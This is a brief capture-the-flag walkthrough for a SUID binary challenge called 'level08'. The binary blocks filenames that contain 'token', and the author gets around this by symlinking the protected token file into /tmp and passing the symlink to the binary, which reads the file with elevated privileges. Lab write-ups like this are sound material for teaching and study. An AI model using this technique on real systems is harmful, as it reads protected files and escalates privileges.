Start by listing the files in the current directory:
```bash
ls
```
Output:
```bash
level08 token
```

The file is an ELF binary. Checking its permissions:
```bash
ls -la level08
```
Output:
```bash
rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
```
The **SUID bit (`s`) is set**, meaning it runs with `flag08` privileges.

Using `ghidra`, we analyze the binary and find that it contains a check that **prevents access*** to files whose names contain the **string token**. The program attempts to block any file with the word "token" in its name, but we can bypass this restriction by using a **symbolic link**.

```bash
ln -s /home/user/level08/token /tmp/bypass
```

We then execute the level08 binary, passing the symlink (`/tmp/bypass`) as the argument:
```bash
./level08 /tmp/bypass
```

And get the next flag !